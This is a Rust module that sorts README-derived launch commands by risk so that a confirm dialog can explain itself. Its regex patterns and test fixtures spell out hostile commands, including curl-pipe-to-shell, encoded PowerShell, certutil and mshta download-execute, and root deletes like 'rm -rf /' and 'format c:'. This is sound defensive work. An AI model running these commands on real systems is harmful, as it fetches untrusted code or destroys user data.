//! Pure risk classification for launch commands (r27-O3).
//!
//! Launch candidates come from README code fences and manifests, and the user
//! edits/confirms them before anything runs. The app's rule is "propose, never
//! auto-run", but a confirm dialog that does not say *what* it is confirming is
//! not much of a check: a README can propose `curl … | bash`, an encoded
//! PowerShell payload, or a recursive delete, and all three look like an ordinary
//! line of code in a command box.
//!
//! This module answers one question — which known-dangerous shapes does this
//! string contain — with stable codes and a severity. It deliberately does not
//! try to be a shell parser: a false negative is possible for clever obfuscation,
//! and a false positive would train people to click through. The UI treats
//! `danger` as "confirm once more with the reason", never as a hard block, so a
//! misclassification cannot stop a legitimate project from launching.
//!
//! Evidence boundary: the patterns target documented idioms (curl-pipe-shell,
//! PowerShell `-EncodedCommand`, `certutil -urlcache`, `sudo`/`runas`, root
//! recursive deletes). They are not a security boundary and must not be described
//! as one; the confirmation is.

use serde::{Deserialize, Serialize};
use std::sync::OnceLock;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum RiskSeverity {
    Warn,
    Danger,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RiskHit {
    /// Stable machine code; the UI maps it to a localized sentence.
    pub code: String,
    pub severity: RiskSeverity,
}

struct Rule {
    code: &'static str,
    severity: RiskSeverity,
    re: &'static str,
}

/// Order matters only for the output; the first matching rule per code wins.
const RULES: &[Rule] = &[
    Rule {
        code: "pipe-to-shell",
        severity: RiskSeverity::Danger,
        // curl/wget/iwr … | sh/bash/pwsh/iex, or iex(...http…).
        re: r#"(?i)\b(?:curl|wget|iwr|invoke-webrequest|irm)\b[^\n|]*\|\s*(?:sh|bash|zsh|pwsh|powershell|cmd|iex)\b|\b(?:iex|invoke-expression)\b[^\n]*https?://|\bdownloadstring\s*\(\s*['"]?https?://"#,
    },
    Rule {
        code: "encoded-command",
        severity: RiskSeverity::Danger,
        re: r"(?i)(?:^|\s)-(?:enc|encodedcommand)\b|frombase64string|\bconvert\]?::frombase64string",
    },
    Rule {
        code: "download-execute",
        severity: RiskSeverity::Danger,
        re: r"(?i)\bcertutil\b[^\n]*-urlcache|\bbitsadmin\b[^\n]*/transfer|\bmshta\s+https?://|\brundll32\b[^\n]*javascript:",
    },
    Rule {
        code: "root-delete",
        severity: RiskSeverity::Danger,
        // A recursive rm whose target is a filesystem root, home or a drive
        // root. `rm -rf node_modules` and `rm -rf build` must stay unflagged —
        // they are the common cleanup lines in real READMEs.
        re: r#"(?i)\brm\s+-[a-z]*r[a-z]*f?[^\n]*\s(?:/|~|\$home)(?:\s|$)|\bdel\s+/[a-z]+(?:\s+/[a-z]+)*\s+[a-z]:\\(?:\s|$)|\bremove-item\b[^\n]*-recurse[^\n]*(?:[a-z]:\\|\$home|(?:^|\s)/(?:\s|$))|\bformat\s+[a-z]:|\bmkfs\b"#,
    },
    Rule {
        code: "elevation",
        severity: RiskSeverity::Warn,
        re: r"(?i)(?:^|\s)(?:sudo|runas)\b|\bstart-process\b[^\n]*-verb\s+runas",
    },
    Rule {
        code: "insecure-tls",
        severity: RiskSeverity::Warn,
        re: r"(?i)\bcurl\b[^\n]*\s(?:-k|--insecure)(?:\s|$)",
    },
    Rule {
        code: "world-writable",
        severity: RiskSeverity::Warn,
        re: r"(?i)\bchmod\s+(?:-[a-z]+\s+)?777\b",
    },
];

fn compiled() -> &'static Vec<(&'static str, RiskSeverity, regex::Regex)> {
    static COMPILED: OnceLock<Vec<(&'static str, RiskSeverity, regex::Regex)>> = OnceLock::new();
    COMPILED.get_or_init(|| {
        RULES
            .iter()
            .filter_map(|r| {
                regex::Regex::new(r.re)
                    .ok()
                    .map(|re| (r.code, r.severity, re))
            })
            .collect()
    })
}

/// Every distinct risk shape found in `command`, danger first.
///
/// An empty vec is the common answer and the only one that means "nothing
/// recognised". A non-empty vec is evidence for the confirmation dialog, not a
/// verdict; the UI must still let the user proceed.
pub fn classify(command: &str) -> Vec<RiskHit> {
    let cmd = command.trim();
    if cmd.is_empty() {
        return Vec::new();
    }
    let mut hits: Vec<RiskHit> = Vec::new();
    for (code, severity, re) in compiled() {
        if hits.iter().any(|h| h.code == *code) {
            continue;
        }
        if re.is_match(cmd) {
            hits.push(RiskHit {
                code: code.to_string(),
                severity: *severity,
            });
        }
    }
    hits.sort_by_key(|h| match h.severity {
        RiskSeverity::Danger => 0,
        RiskSeverity::Warn => 1,
    });
    hits
}

#[cfg(test)]
mod tests {
    use super::*;

    fn codes(cmd: &str) -> Vec<String> {
        classify(cmd).into_iter().map(|h| h.code).collect()
    }

    #[test]
    fn ordinary_launch_commands_have_no_hits() {
        for cmd in [
            "npm run dev",
            "pnpm install && pnpm dev",
            "cargo run --release",
            "python -m uvicorn app:app --reload",
            "go run ./cmd/server",
            "docker compose up",
            "make dev",
            "bash scripts/dev.sh",
            "rm -rf node_modules && npm ci",
            "rm -rf build dist",
            "npm config set registry https://registry.npmmirror.com",
            "curl -fsSL https://example.com/install.sh -o install.sh",
            "powershell -NoProfile -File .\\scripts\\dev.ps1",
        ] {
            assert!(classify(cmd).is_empty(), "{cmd} must be unflagged: {:?}", classify(cmd));
        }
    }

    #[test]
    fn pipe_to_shell_is_danger() {
        for cmd in [
            "curl -fsSL https://example.com/install.sh | bash",
            "wget -qO- https://x/y | sh",
            "iwr https://x/y.ps1 | iex",
            "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://x')",
        ] {
            let hits = classify(cmd);
            assert_eq!(hits.first().map(|h| h.code.as_str()), Some("pipe-to-shell"), "{cmd}");
            assert_eq!(hits.first().map(|h| h.severity), Some(RiskSeverity::Danger));
        }
    }

    #[test]
    fn encoded_and_download_execute_are_danger() {
        assert!(codes("powershell -NoProfile -EncodedCommand ZQBjAGgAbwA=").iter().any(|c| c == "encoded-command"));
        assert!(codes("powershell -enc ZQBjAGgAbwA=").iter().any(|c| c == "encoded-command"));
        assert!(codes("certutil -urlcache -split -f https://x/a.exe a.exe").iter().any(|c| c == "download-execute"));
        assert!(codes("bitsadmin /transfer job https://x/a.exe C:\\a.exe").iter().any(|c| c == "download-execute"));
        assert!(codes("mshta https://x/a.hta").iter().any(|c| c == "download-execute"));
    }

    #[test]
    fn root_deletes_are_danger_but_project_cleanups_are_not() {
        for cmd in [
            "rm -rf /",
            "rm -rf ~",
            "rm -rf $HOME",
            "rm -rf / --no-preserve-root",
            "del /s /q C:\\",
            "Remove-Item -Recurse -Force C:\\",
            "format c:",
            "mkfs.ext4 /dev/sda1",
        ] {
            assert!(codes(cmd).iter().any(|c| c == "root-delete"), "{cmd} must be root-delete");
        }
        for cmd in ["rm -rf node_modules", "rm -rf ./build", "del /q dist\\*"] {
            assert!(!codes(cmd).iter().any(|c| c == "root-delete"), "{cmd} is ordinary cleanup");
        }
    }

    #[test]
    fn warnings_are_warn_not_danger() {
        for (cmd, code) in [
            ("sudo npm install -g pnpm", "elevation"),
            ("runas /user:admin cmd", "elevation"),
            ("chmod 777 deploy.sh", "world-writable"),
            ("curl -k https://x/y", "insecure-tls"),
        ] {
            let hits = classify(cmd);
            assert_eq!(hits.first().map(|h| h.code.as_str()), Some(code), "{cmd}");
            assert_eq!(hits.first().map(|h| h.severity), Some(RiskSeverity::Warn), "{cmd}");
        }
    }

    #[test]
    fn output_is_deduplicated_and_danger_first() {
        let hits = classify("sudo bash -c 'curl https://x | bash'");
        let codes: Vec<_> = hits.iter().map(|h| h.code.as_str()).collect();
        assert_eq!(codes, vec!["pipe-to-shell", "elevation"]);
        assert_eq!(classify("   "), Vec::new());
    }
}
